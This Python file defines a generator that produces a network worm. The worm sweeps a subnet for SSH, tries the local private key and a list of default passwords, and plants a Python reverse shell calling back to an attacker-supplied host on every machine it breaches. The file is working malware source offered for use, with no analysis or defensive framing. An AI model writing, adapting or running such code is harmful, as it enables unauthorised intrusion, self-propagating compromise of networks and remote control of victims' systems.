import base64

class WormGenerator:
    @staticmethod
    def generate_worm_script(lhost, lport, subnet):
        # This script is designed to be uploaded to the victim.
        # It scans the subnet and tries to spread.
        worm_code = f"""
import socket
import threading
import sys
import os
import subprocess
import time

# CONFIG
LHOST = "{lhost}"
LPORT = {lport}
SUBNET = "{subnet}" # e.g. 192.168.1
CREDS = [
    ("root", "toor"), ("admin", "admin"), ("user", "user"), 
    ("ubuntu", "ubuntu"), ("root", "password"), ("pi", "raspberry")
]

def log(msg):
    print(f"[*] {{msg}}")

def get_keys():
    keys = []
    # Try to find local keys
    try:
        if os.path.exists(os.path.expanduser("~/.ssh/id_rsa")):
            keys.append(os.path.expanduser("~/.ssh/id_rsa"))
    except: pass
    return keys

def spread_payload():
    # The payload to execute on new victim
    # Simple Reverse Shell
    return f"nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{{LHOST}}\\",{{LPORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"])' >/dev/null 2>&1 &"

def ssh_brute(ip):
    # Try keys
    keys = get_keys()
    for key in keys:
        cmd = f"ssh -o StrictHostKeyChecking=no -i {{key}} root@{{ip}} \\"{{spread_payload()}}\\""
        if subprocess.call(cmd, shell=True, timeout=5) == 0:
            log(f"INFECTED {{ip}} via KEY")
            return

    # Try Creds (requires sshpass usually, or we skip if not present)
    # Check if sshpass exists
    has_sshpass = subprocess.call("which sshpass", shell=True) == 0
    if has_sshpass:
        for user, pwd in CREDS:
            cmd = f"sshpass -p {{pwd}} ssh -o StrictHostKeyChecking=no {{user}}@{{ip}} \\"{{spread_payload()}}\\""
            try:
                if subprocess.call(cmd, shell=True, timeout=5) == 0:
                    log(f"INFECTED {{ip}} via {{user}}:{{pwd}}")
                    return
            except: pass

def scan_and_infect():
    log(f"Worm Active. Scanning {{SUBNET}}.0/24 ...")
    threads = []
    
    # Simple Ping Sweep Logic or Port Check
    for i in range(1, 255):
        ip = f"{{SUBNET}}.{{i}}"
        # Fast Port Check
        t = threading.Thread(target=check_and_attack, args=(ip,))
        t.start()
        threads.append(t)
        time.sleep(0.05) # Jitter

def check_and_attack(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex((ip, 22)) == 0:
            log(f"SSH Found on {{ip}}. Attacking...")
            ssh_brute(ip)
        s.close()
    except: pass

if __name__ == "__main__":
    scan_and_infect()
    # Also keep connection to C2
    try:
        exec(spread_payload().replace("nohup ", "").replace(" >/dev/null 2>&1 &", ""))
    except: pass
"""
        return worm_code
